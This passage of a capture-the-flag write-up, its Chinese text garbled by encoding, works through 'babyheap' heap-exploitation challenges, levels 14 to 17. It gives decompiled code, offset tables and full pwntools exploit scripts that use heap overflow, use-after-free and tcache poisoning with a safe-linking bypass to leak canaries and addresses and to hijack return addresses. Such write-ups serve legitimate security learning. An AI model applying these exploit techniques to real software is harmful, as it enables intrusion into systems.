class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span class="number">0x13AE</span></span><br><span class="line">win_offset = <span class="number">0x1A22</span></span><br><span class="line">pie_base = __libc_start_main_retaddr_value - start_offset</span><br><span class="line">win_addr= pie_base + win_offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(main_retaddr_offset)</span></span><br><span class="line"><span class="comment"># print(__libc_start_main_retaddr_offset)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__libc_start_main_retaddr_value))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary = &quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.åœ¨å‡å †å—ä¸Šæº¢å‡º</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*canary_offset + p64(canary) </span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(main_retaddr_offset - <span class="built_in">len</span>(payload)) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">scanf(<span class="number">1</span>,payload)</span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(proc.pidof(p)[<span class="number">0</span>])</span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><p>bufferè§†è§’</p>
<table>
<thead>
<tr>
<th></th>
<th>åç§»</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>buffer</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td>chunk_mem</td>
<td>+ 0x40</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x88</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x168</td>
<td></td>
</tr>
</tbody></table>
<p>å‡å †å—è§†è§’</p>
<table>
<thead>
<tr>
<th></th>
<th>åç§»</th>
</tr>
</thead>
<tbody><tr>
<td>chunk_mem</td>
<td>0</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>main_ret</td>
<td>+ 0x58</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>overflow_limit</td>
<td>+ 0x7f</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
</tr>
<tr>
<td>libc_start_main_ret</td>
<td>+ 0x128</td>
</tr>
</tbody></table>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯winå‡½æ•°åœ°å€çš„æœ€ä½å­—èŠ‚æ˜¯0x9å†™ä¸è¿›å»?æ¢æˆ0x1Då°±å¯ä»¥äº†?</p>
<h3 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h3><p>åªæœ‰å †å—çš„å¢åˆ æ”¹æŸ¥ä¸šåŠ¡</p>
<p>è¿˜æ˜¯å€ŸåŠ©<code>echo</code>æ³„éœ²å †æ ˆåœ°å€, ç„¶ååœ¨å †æ ˆä¸Šæ„é€ å‡å †å—,æ¶µç›–è¿”å›åœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//echo</span></span><br><span class="line">  _WORD stack_var[<span class="number">7</span>]; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)stack_var, <span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  argv = (<span class="type">size_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  *argv = (<span class="type">size_t</span>)<span class="string">&quot;/bin/echo&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = (<span class="type">size_t</span>)stack_var;</span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡<code>echo</code>éƒ½ä¼šæœ‰å†…å­˜æ³„éœ², <code>argv</code>è¿™ä¸ªå †å—ä¸ä¼šè¢«é‡Šæ”¾</p>
<p><code>argv[1]</code>ä¿å­˜äº†<code>echo</code>çš„ä¸€ä¸ªå±€éƒ¨å˜é‡çš„åœ°å€, å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ³„éœ²å †æ ˆåœ°å€</p>
<blockquote>
<p>ç„¶è€Œç°åœ¨ä¸èƒ½ä½¿ç”¨<code>UAF</code>, å› ä¸ºåœ¨<code>main</code>ä¸­é‡Šæ”¾å †å—æ—¶ä¼šç«‹åˆ»å°†å †å—æŒ‡é’ˆæ¸…é›¶, é¿å…äº†<code>UAF</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;free&quot;</span>) )            <span class="comment">// free</span></span><br><span class="line">...</span><br><span class="line">      <span class="built_in">free</span>(chunks[index_1]);</span><br><span class="line">      chunks[index_1] = <span class="number">0LL</span>;                  <span class="comment">// æ²¡æœ‰UAF</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä½†æ˜¯<code>main</code>ä¸­<code>read</code>æœ‰å †æº¢å‡º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, <span class="string">&quot;read&quot;</span>) )                <span class="comment">// read</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">index_3 = atoi(input);</span><br><span class="line"><span class="keyword">if</span> ( index_3 &gt; <span class="number">0xF</span> )</span><br><span class="line">  __assert_fail(<span class="string">&quot;allocation_index &lt; 16&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x142</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%127s&quot;</span>, input);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br><span class="line">sizea = atoi(input);	<span class="comment">//è¶Šç•Œå†™å¤šå°‘å®Œå…¨è‡ªå·±å†³å®š</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] read(0, allocations[%d], %d)\n&quot;</span>, index_3, sizea);</span><br><span class="line">read(<span class="number">0</span>, chunks[index_3], sizea);</span><br><span class="line"><span class="built_in">puts</span>(gaps);</span><br></pre></td></tr></table></figure>

<p>ç»¼ä¸Š,æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹:</p>
<p>0x1.é¦–å…ˆ<code>chunk1 = malloc(0x20)</code>,æ‹¿åˆ°ä¸€ä¸ªå †å—,é‚£ä¹ˆç¬¬ä¸€æ¬¡<code>echo</code>æ—¶ç”³è¯·çš„å †å—A,å°±ç´§è·Ÿåœ¨<code>chunk1</code>åé¢é«˜å¤„,è¿™æ˜¯æº¢å‡ºçš„å¿…è¦æ¡ä»¶</p>
<p>0x2.ç¬¬äºŒæ¬¡<code>echo</code>,ä»¥<code>chunk1</code>ä¸ºåŸºåœ°å€,æ³„éœ²å †å—<code>A+0x8</code>åç§»å¤„çš„å †æ ˆåœ°å€,å¹¶æ ¹æ®ç›¸å¯¹è·ç¦»è®¡ç®—å¾—åˆ°<code>main</code>å‡½æ•°å’Œ<code>libc_start_main</code>å‡½æ•°çš„è¿”å›åœ°å€</p>
<p>0x3.åˆ©ç”¨å †æº¢å‡ºé€ æˆä»»æ„åœ°å€è¯»,æ ¹æ®<code>libc_start_main</code>è¿”å›åˆ°<code>start</code>ä¸­çš„åœ°å€,è®¡ç®—å¾—åˆ°<code>pie</code>åŸºå€,æ ¹æ®<code>win</code>çš„åç§»é‡è®¡ç®—å¾—åˆ°<code>win</code>çš„åœ°å€</p>
<p>0x4.åˆ©ç”¨å †æº¢å‡ºé€ æˆçš„ä»»æ„åœ°å€å†™,ä¿®æ”¹<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€ä¸º<code>win</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level15.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level15.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,size=<span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(offset)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>):</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;read&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)    </span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):				</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  data = echo(<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">addr,content</span>):</span><br><span class="line">  malloc(<span class="number">2</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">  free(<span class="number">4</span>)</span><br><span class="line">  free(<span class="number">3</span>)</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(<span class="number">0x31</span>)+p64(addr)</span><br><span class="line">  read(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">  malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">  malloc(<span class="number">6</span>,<span class="number">0x10</span>)</span><br><span class="line">  read(<span class="number">6</span>,<span class="number">6</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">echo(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">data = echo(<span class="number">0</span>,<span class="number">0x38</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">stack_leak_addr = data</span><br><span class="line"></span><br><span class="line">main_ret = stack_leak_addr + <span class="number">0x176</span></span><br><span class="line">libc_start_main_ret = stack_leak_addr + <span class="number">0x246</span></span><br><span class="line"></span><br><span class="line">data = leak(libc_start_main_ret)    <span class="comment">#arbitrary read</span></span><br><span class="line">pie_base = data - <span class="number">0x142E</span></span><br><span class="line">win_addr = pie_base + <span class="number">0x1B00</span></span><br><span class="line"></span><br><span class="line">modify(main_ret,p64(win_addr))      <span class="comment">#arbitrary write</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h3><p>level16.0ä¸­ä½¿ç”¨libc-2.35,æ­¤æ—¶nextæŒ‡é’ˆå·²ç»è¢«ä¿æŠ¤èµ·æ¥</p>
<p>åˆ©ç”¨ <code>tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•/glibc-2.38/exploit/[safe-linking]*</code>çš„æ€è·¯</p>
<p><strong>å‡è®¾fake_chunk_memå·²ç»å¯¹é½åˆ°0x10</strong></p>
<p>0x0.chunk0 &#x3D; malloc(0x10)</p>
<p>0x1.chunk1 &#x3D; malloc(0x10)</p>
<p>0x2.chunk2 &#x3D; malloc(0x10)</p>
<p>0x3.free(chunk1)</p>
<p>0x4.free(chunk2)</p>
<p>0x5.[UAF] chunk2.next &#x3D;  ( é¡µæ¡†å· ) ^ (fake_chunk_mem)</p>
<p>0x6.chunk2 &#x3D; malloc()</p>
<p>0x7.fake_chunk &#x3D; malloc()</p>
<blockquote>
<p>æ­¤æ—¶fake_chunk.keyå½’é›¶</p>
<p>tcache-&gt;entries[idx] &#x3D; REVEAL_PTR(fake_chunk.next)</p>
</blockquote>
<p>0x8.free(chunk0)</p>
<blockquote>
<p>æ­¤æ—¶chunk0.next &#x3D; PROTECT_PTR(REVEAL_PTR(fake_chunk.next))</p>
</blockquote>
<p>0x9.[UAF] puts(chunk0.next)</p>
<p>0xA.è®¡ç®—fake_chunk.next</p>
<blockquote>
<p>fake_chunk.next &#x3D; chunk0.next ^ (é¡µæ¡†å·) ^ (fake_chunk_addr &gt;&gt; 12)</p>
</blockquote>
<p>å†™ä¸ªexpæ„æ€æ„æ€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap_level16.0&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyheap_level16.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index, size = <span class="number">0</span></span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode() </span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr,size = <span class="number">0x10</span></span>):		//addr must be aligned to <span class="number">0x10</span></span><br><span class="line">    malloc(<span class="number">3</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)</span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = puts(<span class="number">1</span>)</span><br><span class="line">    chunk2_next = puts(<span class="number">2</span>)</span><br><span class="line">    chunk1_next = <span class="built_in">int</span>.from_bytes(chunk1_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    chunk2_next = <span class="built_in">int</span>.from_bytes(chunk2_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(chunk1_next))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next previously = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    chunk2_next = chunk1_next ^ addr</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk2_next now = &quot;</span>,<span class="built_in">hex</span>(chunk2_next))</span><br><span class="line">    scanf(<span class="number">2</span>,p64(chunk2_next))</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">2</span>,size)</span><br><span class="line">    malloc(<span class="number">1</span>,size)    </span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    chunk3_next = puts(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">    chunk3_next = <span class="built_in">int</span>.from_bytes(chunk3_next, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ep = chunk1_next ^ chunk3_next</span><br><span class="line">    data = (addr &gt;&gt; <span class="number">12</span>) ^ ep</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x433050</span></span><br><span class="line">malloc(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">page_num = puts(<span class="number">9</span>)</span><br><span class="line">page_num = <span class="built_in">int</span>.from_bytes(page_num, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(page_num))</span><br><span class="line"></span><br><span class="line">data = leak(secret_addr,<span class="number">0x10</span>)		//secret_addr = <span class="number">0x433050</span> <span class="keyword">is</span> aligned to <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(data))</span><br><span class="line">data = data.to_bytes(<span class="number">8</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line">payload = data + p64(<span class="number">0</span>) </span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">send_flag(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h3><p>ret2text</p>
<p>åˆ©ç”¨å †UAFå°†è¿”å›åœ°å€æ”¾åˆ°å †å—ä¸Š</p>
<p>è°ƒè¯•å‘ç°è¿”å›åœ°å€éƒ½å¯¹é½åˆ°0x8</p>
<p>ä¸æ»¡è¶³å †å—å¯¹é½åˆ°0x10çš„è¦æ±‚</p>
<p>å› æ­¤å‡å †å—å¯ä»¥åœ¨è¿”å›åœ°å€-0x8,-0x18ç­‰å¤„</p>
<p>ä½†æ˜¯è¿˜æœ‰é«˜æ‰‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v3 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">sprintf</span>(input, <span class="string">&quot;%%%us&quot;</span>, v3);</span><br><span class="line">v4 = malloc_usable_size(chunks[index_2]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] scanf(\&quot;%%%us\&quot;, allocations[%d])\n&quot;</span>, v4, index_2);</span><br><span class="line"><span class="built_in">scanf</span>(input, chunks[index_2]);</span><br></pre></td></tr></table></figure>

<p>åœ¨å¾€å‡å †å—å†™å…¥ä¹‹å‰,è¿˜æœ‰ä¸€ä¸ªåº“å‡½æ•°<code>malloc_usable_size</code>è°ƒç”¨,è¿™ä½æ›´æ˜¯é‡é‡çº§,ä»–ä¼šè°ƒç”¨<code>musable</code></p>
<p>è¿™ä½æ›´æ˜¯é‡ä¸­ä¹‹é‡é‡çº§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">musable</span><span class="params">(<span class="type">void</span> *mem)</span></span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))</span><br><span class="line">        <span class="keyword">return</span> chunksize(p) - CHUNK_HDR_SZ;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (inuse(p))</span><br><span class="line">        <span class="keyword">return</span> memsize(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœ<code>p</code>æ²¡æœ‰<code>Mmap (2)</code>æ ‡å¿—ä½,ä¼šè°ƒç”¨<code>inuse(p)</code>è¿™ä¸ªå‡½æ•°ä¼šæŸ¥çœ‹<strong>ä¸‹ä¸€ä¸ª</strong>å †å—çš„<code>Prev_in_use (1)</code>æ ‡å¿—ä½æ¥åˆ¤å®š<strong>å½“å‰</strong>å †å—æ˜¯å¦ä½¿ç”¨</p>
